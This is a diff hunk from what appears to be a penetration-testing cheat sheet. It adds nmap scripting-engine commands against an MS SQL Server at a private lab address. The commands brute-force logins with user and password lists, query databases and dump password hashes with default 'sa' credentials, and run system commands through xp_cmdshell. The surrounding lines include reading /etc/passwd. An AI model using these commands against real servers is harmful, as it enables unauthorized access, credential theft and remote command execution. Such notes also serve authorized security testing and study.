@@ -285,3 +285,14 @@ cat /etc/passwd   #Users in linux
 fsutil fsinfo drives     #windows 
 lsblk -l                 #Linux
 ```
+
+locate *.nse | grep ms-sql
+nmap -p 1433 --script ms-sql-info 192.168.1.146
+nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.146
+nmap -p1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=Password@1,ms-sql-query.query="sp_databases" 192.168.1.146
+nmap -p1433 --script ms-sql-ntlm-info 192.168.1.146
+nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146
+nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=Password@1,ms-sql-xp-cmdshell.cmd="net user" 192.168.1.146
+nmap -p1433 --script ms-sql-empty-password 192.168.1.146
+nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146
+
